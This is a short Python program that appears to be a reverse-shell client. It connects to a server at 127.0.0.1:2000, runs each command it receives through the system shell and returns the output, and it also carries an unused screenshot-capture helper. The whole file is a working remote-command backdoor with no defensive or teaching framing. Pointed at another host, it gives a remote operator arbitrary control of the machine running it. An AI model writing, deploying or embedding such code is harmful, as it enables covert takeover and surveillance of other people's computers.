import json
import socket
import subprocess
import struct
import pyautogui
import io


def execute_command(command):
    """Execute a system command and return its output or error."""
    try:
        # Run the command and capture output
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else ""
        error = result.stderr if result.stderr else ""
        return output + error
    except Exception as e:
        return f"Error: {str(e)}"


def get_screenshot():
    screenshot = pyautogui.screenshot()
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='PNG')
    img_data = img_bytes.getvalue()
    return img_data


def main():
    # Create a TCP client socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the server
        client_socket.connect(("127.0.0.1", 2000))
        print("Connected to server at 127.0.0.1:2000")

        while True:
            # Receive the command from the server
            request_str = client_socket.recv(1024).decode('utf-8')
            if not request_str:
                print("No command received or server disconnected.")
                break
            print(f"Received command: {request_str}")
            request = json.loads(request_str)

            # Execute the command
            result = execute_command(request["command"])
            print(f"Command output: {result}")
            print(len(result))

            # Send the result back to the server
            size = struct.pack(">I", len(result))
            client_socket.send(size)
            client_socket.send(result.encode('utf-8'))
            print("Result sent to server.")


    except Exception as e:
        print(f"Error: {e}")
    finally:
        # Close the client socket
        client_socket.close()
        print("Client socket closed.")


if __name__ == "__main__":
    main()
